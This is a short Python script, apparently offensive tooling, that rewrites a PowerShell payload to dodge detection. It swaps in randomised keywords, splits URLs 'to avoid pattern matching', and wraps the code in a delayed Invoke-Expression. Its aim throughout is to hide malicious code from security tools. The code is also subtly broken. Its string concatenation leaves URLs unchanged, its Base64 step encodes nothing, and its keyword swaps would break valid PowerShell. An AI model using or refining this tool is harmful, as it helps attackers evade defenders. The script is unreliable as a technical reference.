#!/usr/bin/env python3
import sys
import base64
import random
import string

def obfuscate_powershell(input_file, output_file):
    """Apply obfuscation techniques to PowerShell payload"""
    
    print("[*] Reading payload...")
    with open(input_file, 'r') as f:
        payload = f.read()
    
    # Technique 1: Variable substitution
    vars_to_replace = {
        'Invoke': ''.join(random.choices(string.ascii_letters, k=8)),
        'System': ''.join(random.choices(string.ascii_letters, k=8)),
        'Reflection': ''.join(random.choices(string.ascii_letters, k=8))
    }
    
    for orig, new in vars_to_replace.items():
        payload = payload.replace(orig, new)
    
    # Technique 2: String concatenation
    print("[*] Applying string concatenation...")
    lines = payload.split('\n')
    obfuscated_lines = []
    
    for line in lines:
        if 'http' in line.lower():
            # Split URLs to avoid pattern matching
            line = line.replace('https://', 'ht'+'tps://')
            line = line.replace('http://', 'ht'+'tp://')
        obfuscated_lines.append(line)
    
    # Technique 3: Base64 wrap critical sections
    print("[*] Encoding critical sections...")
    final_payload = '\n'.join(obfuscated_lines)
    
    # Create wrapper with delayed execution
    wrapper = f"""
$code = @"
{final_payload}
"@

# Delayed execution
Start-Sleep -Milliseconds {random.randint(500, 2000)}
Invoke-Expression $code
"""
    
    print("[*] Writing obfuscated payload...")
    with open(output_file, 'w') as f:
        f.write(wrapper)
    
    print(f"[+] Obfuscation complete: {output_file}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 obfuscate.py <input.ps1> <output.ps1>")
        sys.exit(1)
    
    obfuscate_powershell(sys.argv[1], sys.argv[2])
